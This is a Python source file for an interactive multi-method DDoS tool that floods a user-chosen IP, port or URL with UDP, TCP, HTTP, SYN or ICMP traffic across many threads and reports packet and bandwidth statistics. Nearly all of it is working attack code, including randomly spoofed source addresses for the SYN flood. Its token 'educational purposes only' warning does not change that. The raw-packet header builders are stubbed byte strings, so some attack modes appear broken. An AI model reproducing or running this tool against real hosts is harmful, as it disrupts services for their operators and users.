import socket
import threading
import time
import random
import string
import requests
import sys
import os
from colorama import Fore, Style, init

init(autoreset=True)

class AdvancedDDoS:
    def __init__(self):
        self.target_ip = None
        self.target_port = None
        self.attack_type = None
        self.threads = 50
        self.duration = 60
        self.is_attacking = False
        self.stats = {
            'packets_sent': 0,
            'bytes_sent': 0,
            'start_time': 0,
            'successful_requests': 0,
            'failed_requests': 0
        }

    def print_banner(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"{Fore.MAGENTA}")
        print("   █████   █    ██  ▄▄▄       ███▄    █ ▄▄▄█████▓ █    ██  ███▄ ▄███▓")
        print(" ▒██▓  ██▒ ██  ▓██▒▒████▄     ██ ▀█   █ ▓  ██▒ ▓▒ ██  ▓██▒▓██▒▀█▀ ██▒")
        print(" ▒██▒  ██░▓██  ▒██░▒██  ▀█▄  ▓██  ▀█ ██▒▒ ▓██░ ▒░▓██  ▒██░▓██    ▓██░")
        print(" ░██  █▀ ░▓▓█  ░██░░██▄▄▄▄██ ▓██▒  ▐▌██▒░ ▓██▓ ░ ▓▓█  ░██░▒██    ▒██ ")
        print(" ░▒███▒█▄ ▒▒█████▓  ▓█   ▓██▒▒██░   ▓██░  ▒██▒ ░ ▒▒█████▓ ▒██▒   ░██▒")
        print(" ░░ ▒▒░ ▒ ░▒▓▒ ▒ ▒  ▒▒   ▓▒█░░ ▒░   ▒ ▒   ▒ ░░   ░▒▓▒ ▒ ▒ ░ ▒░   ░  ░")
        print("  ░ ▒░  ░ ░░▒░ ░ ░   ▒   ▒▒ ░░ ░░   ░ ▒░    ░    ░░▒░ ░ ░ ░  ░      ░")
        print("    ░   ░  ░░░ ░ ░   ░   ▒      ░   ░ ░   ░       ░░░ ░ ░ ░      ░   ")
        print("     ░       ░           ░  ░         ░             ░            ░   ")
        print(f"{Fore.MAGENTA}                                by Sqrilizz\n")
        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════════════════════════════════╗")
        print(f"{Fore.CYAN}║                           ADVANCED DDoS TOOL                                ║")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════════════════════════════════╝\n")

    def get_user_input(self):
        print(f"{Fore.YELLOW}[*] Select attack type:")
        print(f"{Fore.WHITE}    1. UDP Flood (Fast)")
        print(f"{Fore.WHITE}    2. TCP Flood (Reliable)")
        print(f"{Fore.WHITE}    3. HTTP Flood (Web)")
        print(f"{Fore.WHITE}    4. SYN Flood (Network)")
        print(f"{Fore.WHITE}    5. ICMP Flood (Ping)")
        
        while True:
            try:
                choice = input(f"\n{Fore.YELLOW}[*] Enter choice (1-5): ").strip()
                if choice in ['1', '2', '3', '4', '5']:
                    attack_types = {
                        '1': 'UDP',
                        '2': 'TCP', 
                        '3': 'HTTP',
                        '4': 'SYN',
                        '5': 'ICMP'
                    }
                    self.attack_type = attack_types[choice]
                    break
                else:
                    print(f"{Fore.RED}[!] Invalid choice. Please enter 1-5.")
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}[!] Operation cancelled")
                return False

        print(f"\n{Fore.YELLOW}[*] Enter target IP: ", end="")
        self.target_ip = input().strip()
        
        if self.attack_type == 'HTTP':
            print(f"{Fore.YELLOW}[*] Enter target URL (with http:// or https://): ", end="")
            self.target_url = input().strip()
            if not self.target_url.startswith(('http://', 'https://')):
                self.target_url = f"http://{self.target_url}"
        else:
            print(f"{Fore.YELLOW}[*] Enter target port (default 80): ", end="")
            port_input = input().strip()
            self.target_port = int(port_input) if port_input else 80

        print(f"{Fore.YELLOW}[*] Enter number of threads (default 50): ", end="")
        threads_input = input().strip()
        self.threads = int(threads_input) if threads_input else 50

        print(f"{Fore.YELLOW}[*] Enter attack duration in seconds (default 60): ", end="")
        duration_input = input().strip()
        self.duration = int(duration_input) if duration_input else 60

        return True

    def udp_flood(self):
        """UDP Flood Attack"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes_array = bytearray(random.getrandbits(8) for _ in range(1024))
        
        while self.is_attacking:
            try:
                sock.sendto(bytes_array, (self.target_ip, self.target_port))
                self.stats['packets_sent'] += 1
                self.stats['bytes_sent'] += len(bytes_array)
                self.stats['successful_requests'] += 1
            except:
                self.stats['failed_requests'] += 1
                pass

    def tcp_flood(self):
        """TCP Flood Attack"""
        while self.is_attacking:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((self.target_ip, self.target_port))
                sock.send(b"GET / HTTP/1.1\r\n" * 1000)
                sock.close()
                self.stats['packets_sent'] += 1
                self.stats['bytes_sent'] += 1000
                self.stats['successful_requests'] += 1
            except:
                self.stats['failed_requests'] += 1
                pass

    def http_flood(self):
        """HTTP Flood Attack"""
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
        }
        
        while self.is_attacking:
            try:
                response = requests.get(self.target_url, headers=headers, timeout=1, verify=False)
                self.stats['packets_sent'] += 1
                self.stats['bytes_sent'] += len(response.content)
                self.stats['successful_requests'] += 1
            except:
                self.stats['failed_requests'] += 1
                pass

    def syn_flood(self):
        """SYN Flood Attack"""
        while self.is_attacking:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                
                # Create fake IP
                source_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
                
                # Create TCP packet
                tcp_header = self.create_tcp_header(source_ip, self.target_ip, random.randint(1024, 65535), self.target_port)
                ip_header = self.create_ip_header(source_ip, self.target_ip, len(tcp_header))
                
                packet = ip_header + tcp_header
                sock.sendto(packet, (self.target_ip, 0))
                
                self.stats['packets_sent'] += 1
                self.stats['bytes_sent'] += len(packet)
                self.stats['successful_requests'] += 1
            except:
                self.stats['failed_requests'] += 1
                pass

    def icmp_flood(self):
        """ICMP Flood Attack"""
        while self.is_attacking:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                
                # Create ICMP packet
                icmp_packet = self.create_icmp_packet()
                sock.sendto(icmp_packet, (self.target_ip, 0))
                
                self.stats['packets_sent'] += 1
                self.stats['bytes_sent'] += len(icmp_packet)
                self.stats['successful_requests'] += 1
            except:
                self.stats['failed_requests'] += 1
                pass

    def create_tcp_header(self, source_ip, dest_ip, source_port, dest_port):
        """Create TCP header for SYN flood"""
        # Simplified TCP header creation
        tcp_header = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x50\x02\x20\x00\x00\x00\x00\x00'
        return tcp_header

    def create_ip_header(self, source_ip, dest_ip, tcp_length):
        """Create IP header"""
        # Simplified IP header creation
        ip_header = b'\x45\x00\x00\x28\x00\x00\x40\x00\x40\x06\x00\x00'
        return ip_header

    def create_icmp_packet(self):
        """Create ICMP packet"""
        # Simplified ICMP packet
        icmp_packet = b'\x08\x00\x00\x00\x00\x01\x00\x01' + b'X' * 56
        return icmp_packet

    def print_stats(self):
        """Print real-time statistics"""
        while self.is_attacking:
            elapsed = time.time() - self.stats['start_time']
            if elapsed > 0:
                packets_per_sec = self.stats['packets_sent'] / elapsed
                mb_per_sec = (self.stats['bytes_sent'] / 1024 / 1024) / elapsed
                success_rate = (self.stats['successful_requests'] / (self.stats['successful_requests'] + self.stats['failed_requests'])) * 100 if (self.stats['successful_requests'] + self.stats['failed_requests']) > 0 else 0
                
                print(f"\r{Fore.CYAN}[*] {self.attack_type} Attack | "
                      f"Packets: {self.stats['packets_sent']:,} | "
                      f"Speed: {packets_per_sec:.0f} pkt/s | "
                      f"Bandwidth: {mb_per_sec:.1f} MB/s | "
                      f"Success: {success_rate:.1f}% | "
                      f"Time: {int(elapsed)}s", end='', flush=True)
            
            time.sleep(1)

    def start_attack(self):
        """Start the DDoS attack"""
        print(f"\n{Fore.RED}[!] WARNING: This tool is for educational purposes only!")
        print(f"{Fore.RED}[!] Using this tool for illegal activities is your responsibility!")
        print(f"{Fore.YELLOW}[?] Continue? (y/n): ", end="")
        
        if input().lower() != 'y':
            print(f"{Fore.YELLOW}[!] Operation cancelled")
            return

        if not self.get_user_input():
            return

        print(f"\n{Fore.GREEN}[+] Starting {self.attack_type} attack on {self.target_ip}")
        print(f"{Fore.GREEN}[+] Threads: {self.threads} | Duration: {self.duration}s")
        print(f"{Fore.YELLOW}[*] Press Ctrl+C to stop\n")

        self.is_attacking = True
        self.stats['start_time'] = time.time()

        # Start attack threads
        attack_methods = {
            'UDP': self.udp_flood,
            'TCP': self.tcp_flood,
            'HTTP': self.http_flood,
            'SYN': self.syn_flood,
            'ICMP': self.icmp_flood
        }

        attack_threads = []
        for _ in range(self.threads):
            thread = threading.Thread(target=attack_methods[self.attack_type])
            thread.daemon = True
            thread.start()
            attack_threads.append(thread)

        # Start stats thread
        stats_thread = threading.Thread(target=self.print_stats)
        stats_thread.daemon = True
        stats_thread.start()

        try:
            time.sleep(self.duration)
        except KeyboardInterrupt:
            pass

        self.is_attacking = False
        time.sleep(1)  # Let threads finish

        # Final statistics
        total_time = time.time() - self.stats['start_time']
        total_mb = self.stats['bytes_sent'] / 1024 / 1024
        total_gb = total_mb / 1024

        print(f"\n\n{Fore.GREEN}╔══════════════════════════════════════════════════════════════════════════════╗")
        print(f"{Fore.GREEN}║                              ATTACK COMPLETED                               ║")
        print(f"{Fore.GREEN}╚══════════════════════════════════════════════════════════════════════════════╝")
        print(f"{Fore.YELLOW}[*] Attack Type: {self.attack_type}")
        print(f"{Fore.YELLOW}[*] Target: {self.target_ip}")
        print(f"{Fore.YELLOW}[*] Duration: {total_time:.1f} seconds")
        print(f"{Fore.YELLOW}[*] Total Packets Sent: {self.stats['packets_sent']:,}")
        print(f"{Fore.YELLOW}[*] Total Data Sent: {total_mb:.1f} MB ({total_gb:.2f} GB)")
        print(f"{Fore.YELLOW}[*] Successful Requests: {self.stats['successful_requests']:,}")
        print(f"{Fore.YELLOW}[*] Failed Requests: {self.stats['failed_requests']:,}")
        print(f"{Fore.YELLOW}[*] Average Speed: {self.stats['packets_sent']/total_time:.0f} packets/sec")
        print(f"{Fore.YELLOW}[*] Average Bandwidth: {total_mb/total_time:.1f} MB/s")

def main():
    ddos = AdvancedDDoS()
    ddos.print_banner()
    ddos.start_attack()

if __name__ == '__main__':
    main()
